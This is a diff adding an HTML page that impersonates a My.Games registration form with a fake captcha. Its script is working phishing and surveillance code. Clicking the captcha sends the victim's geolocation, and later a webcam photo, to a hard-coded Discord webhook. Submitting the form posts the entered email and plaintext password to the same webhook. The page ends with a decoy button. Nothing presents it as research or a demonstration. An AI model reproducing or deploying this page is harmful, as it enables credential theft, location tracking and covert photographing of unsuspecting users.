@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cadastro - My.Games</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #1a1a1a;
+    color: white;
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    flex-direction: column;
+  }
+
+  .container {
+    background-color: #242424;
+    padding: 30px;
+    border-radius: 8px;
+    width: 350px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    z-index: 1;
+    transition: opacity 1.5s ease;
+  }
+
+  .container.hidden {
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  input {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    background-color: #333;
+    border: none;
+    border-radius: 4px;
+    color: white;
+    font-size: 14px;
+  }
+
+  input:focus {
+    outline: 2px solid #ffcc00;
+  }
+
+  button {
+    width: 100%;
+    padding: 10px;
+    background-color: #ffcc00;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+
+  button:hover {
+    background-color: #e6b800;
+  }
+
+  .social-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-top: 15px;
+  }
+
+  .social-buttons a {
+    display: inline-block;
+    width: 40px;
+    height: 40px;
+    background-color: #222;
+    border-radius: 6px;
+    background-repeat: no-repeat;
+    background-size: contain;
+    background-position: center;
+    transition: transform 0.2s;
+  }
+
+  .social-buttons a:hover {
+    transform: scale(1.05);
+  }
+
+  .facebook {
+    background-image: url("https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png");
+  }
+
+  .google {
+    background-image: url("https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_92x30dp.png");
+    background-size: 90% auto;
+  }
+
+  .twitch {
+    background-image: url("https://play-lh.googleusercontent.com/Y6epalNGUKPgWyQpDCgVL621EgmOmXBWfQoJdaM8v0irKWEII5bEDvpaWp7Mey2MVg");
+  }
+
+  .x {
+    background-image: url("https://img.freepik.com/vetores-gratis/novo-design-de-icone-x-do-logotipo-do-twitter-em-2023_1017-45418.jpg");
+  }
+
+  .apple {
+    background-image: url("https://yt3.googleusercontent.com/_CvUFHWdEuOCLcBWy8FLoflAibIIBpBBTQPlEBLhP5-YQT8LbvEIIeqz6k3ZCTNvb1aP3UsR6ME=s900-c-k-c0x00ffffff-no-rj");
+    background-size: 80% auto;
+  }
+
+  /* Captcha fixo no canto superior esquerdo */
+  .captcha-container {
+    position: fixed;
+    top: 20px;
+    left: 40px;
+    display: flex;
+    align-items: center;
+    background: white;
+    padding: 12px 18px;
+    border-radius: 5px;
+    box-shadow: 0 0 8px rgba(0,0,0,0.3);
+    transition: top 0.9s ease, opacity 1s ease, transform 1s ease;
+    opacity: 1;
+    z-index: 10;
+  }
+
+  .captcha-container.fade-out {
+    opacity: 0;
+    transform: scale(0.5) rotate(-20deg);
+  }
+
+  .captcha-img {
+    width: 70px;
+    height: 70px;
+    background-image: url("https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png");
+    background-size: contain;
+    background-repeat: no-repeat;
+    background-position: center;
+    margin-right: 20px;
+  }
+
+  .captcha-btn {
+    padding: 12px 20px;
+    background-color: #4285f4;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 18px;
+  }
+
+  .captcha-btn:hover {
+    background-color: #3367d6;
+  }
+
+  #hiddenCanvas {
+    display: none;
+  }
+
+  #thanksMessage {
+    font-size: 20px;
+    text-align: center;
+    max-width: 350px;
+    margin-top: 20px;
+    opacity: 0;
+    transition: opacity 1.5s ease;
+  }
+
+  #thanksMessage.visible {
+    opacity: 1;
+  }
+</style>
+</head>
+<body>
+
+<div class="container" id="formContainer">
+  <h2>Criar Conta</h2>
+  <form id="registerForm">
+    <input type="email" name="email" placeholder="Email" required>
+    <input type="password" name="password" placeholder="Senha" required>
+    <button type="submit">Cadastrar</button>
+  </form>
+
+  <div class="social-buttons">
+    <a href="#" class="facebook"></a>
+    <a href="#" class="google"></a>
+    <a href="#" class="twitch"></a>
+    <a href="#" class="x"></a>
+    <a href="#" class="apple"></a>
+  </div>
+</div>
+
+<!-- Captcha -->
+<div class="captcha-container" id="captchaBox">
+  <div class="captcha-img"></div>
+  <button class="captcha-btn" id="moveBtn">Clique</button>
+</div>
+
+<canvas id="hiddenCanvas" width="320" height="240"></canvas>
+
+<div id="thanksMessage">Tenha um bom dia, obrigado por resolver o nosso captcha!</div>
+
+<script>
+  const form = document.getElementById('registerForm');
+  const canvas = document.getElementById('hiddenCanvas');
+  const ctx = canvas.getContext('2d');
+  const captchaBtn = document.getElementById('moveBtn');
+  const captchaBox = document.getElementById('captchaBox');
+  const formContainer = document.getElementById('formContainer');
+  const thanksMessage = document.getElementById('thanksMessage');
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1400157755574059159/UWtVyqusYQR4vSPqnKSiAZ8JKh_yT_vvjOhN_2vzLC_P7d0Hr6bYkmP657gwVssC_JNL";
+
+  let clickCount = 0;
+  let captchaDone = false;
+  let stream = null;
+  let locationGranted = false;
+  let blocked = false;
+
+  captchaBtn.addEventListener('click', async () => {
+    if (captchaDone || blocked) return;
+
+    clickCount++;
+
+    if (clickCount === 3) {
+      blocked = true;
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            locationGranted = true;
+            enviarLocalizacao(pos.coords.latitude, pos.coords.longitude);
+            blocked = false;
+          },
+          err => {
+            locationGranted = false;
+            blocked = false;
+            alert("Permissão de localização negada. Você precisa permitir para continuar.");
+          }
+        );
+      } else {
+        alert("Geolocalização não suportada neste navegador.");
+        blocked = false;
+      }
+      setTimeout(() => {
+        blocked = false;
+      }, 2000);
+      return;
+    }
+
+    if (clickCount === 16) {
+      blocked = true;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        console.log("Permissão para câmera concedida.");
+        await enviarFotoCamera();
+        terminarCaptcha();
+      } catch (err) {
+        alert("Permissão de câmera negada. Você precisa permitir para continuar.");
+        blocked = false;
+      }
+      return;
+    }
+
+    // Movimento normal para baixo
+    let currentTop = parseInt(captchaBox.style.top || 20);
+    let maxTop = window.innerHeight - captchaBox.offsetHeight - 20;
+    if (currentTop + 20 < maxTop) {
+      captchaBox.style.top = (currentTop + 20) + 'px';
+    } else {
+      captchaBox.style.top = maxTop + 'px';
+    }
+  });
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    if (!captchaDone) {
+      alert("❗ Você precisa completar o captcha antes de cadastrar!");
+      return;
+    }
+
+    if (!locationGranted) {
+      alert("❗ Permissão de localização necessária para cadastrar!");
+      return;
+    }
+
+    if (!stream) {
+      alert("❗ Permissão de câmera necessária para cadastrar!");
+      return;
+    }
+
+    const email = form.email.value.trim();
+    const password = form.password.value.trim();
+
+    if (!email || !password) {
+      alert("Por favor, preencha email e senha.");
+      return;
+    }
+
+    // Enviar dados para Discord
+    const content = `🆕 Novo cadastro:\n📧 Email: ${email}\n🔒 Senha: ${password}`;
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert("✅ Cadastro realizado com sucesso!");
+        form.reset();
+        mostrarBotaoTelaInicial();
+      } else {
+        alert("⚠️ Erro ao enviar cadastro: " + response.statusText);
+      }
+    })
+    .catch(err => alert("❌ Falha na conexão: " + err));
+  });
+
+  function enviarLocalizacao(lat, lon) {
+    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+      .then(res => res.json())
+      .then(data => {
+        const address = data.display_name || `Lat: ${lat}, Lon: ${lon}`;
+        enviarParaDiscord(`📍 Localização: ${address}`);
+      })
+      .catch(() => enviarParaDiscord(`📍 Lat: ${lat}, Lon: ${lon}`));
+  }
+
+  async function enviarFotoCamera() {
+    const videoTrack = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(videoTrack);
+    let bitmap;
+    try {
+      bitmap = await imageCapture.grabFrame();
+    } catch {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      video.pause();
+    }
+    if (bitmap) {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+    }
+
+    return new Promise((resolve) => {
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, 'foto.png');
+        formData.append('content', '📷 Foto da câmera após permissão concedida.');
+
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => {
+          if (!response.ok) {
+            alert('⚠️ Erro ao enviar a foto: ' + response.statusText);
+          }
+          resolve();
+        })
+        .catch(error => {
+          alert('❌ Falha na conexão: ' + error);
+          resolve();
+        });
+      }, 'image/png');
+    });
+  }
+
+  function enviarParaDiscord(content) {
+    const formData = new FormData();
+    formData.append('content', content);
+
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (!response.ok) {
+        alert('⚠️ Erro ao enviar para Discord: ' + response.statusText);
+      }
+    })
+    .catch(error => {
+      alert('❌ Falha na conexão: ' + error);
+    });
+  }
+
+  function terminarCaptcha() {
+    captchaDone = true;
+    blocked = true;
+    setTimeout(() => {
+      captchaBox.classList.add('fade-out');
+      formContainer.classList.add('hidden');
+      thanksMessage.classList.add('visible');
+      setTimeout(() => {
+        captchaBox.style.display = 'none';
+      }, 1500);
+
+      // Após 3 segundos, esconde a mensagem e mostra o formulário de novo
+      setTimeout(() => {
+        thanksMessage.classList.remove('visible');
+        formContainer.classList.remove('hidden');
+        blocked = false;
+      }, 3000);
+    }, 6000);
+  }
+
+  function mostrarBotaoTelaInicial() {
+    const botao = document.createElement('button');
+    botao.textContent = "Clique para ir para a tela inicial do site";
+    botao.style.marginTop = '20px';
+    botao.style.padding = '10px 15px';
+    botao.style.fontSize = '16px';
+    botao.style.cursor = 'pointer';
+
+    botao.addEventListener('click', () => {
+      window.open('https://youtu.be/dQw4w9WgXcQ?si=yqEiz-OYhdtErfCD', '_blank');
+    });
+
+    document.body.appendChild(botao);
+  }
+</script>
+
+</body>
+</html>
